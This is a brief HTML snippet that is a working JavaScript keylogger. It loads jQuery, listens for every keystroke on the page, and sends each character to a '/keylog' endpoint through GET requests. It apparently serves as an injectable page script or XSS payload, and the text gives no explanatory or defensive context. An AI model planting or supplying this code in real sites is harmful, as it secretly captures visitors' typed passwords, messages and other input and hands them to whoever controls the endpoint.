<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script>
  $(document).keydown(function(x){
    console.log(x);
    key = String.fromCharCode(x.charCode || x.keyCode || x.which);
    if (!x.shiftKey) {
      key = key.toLowerCase();
    }
    $.get('/keylog', {'key': key});
  });
</script>
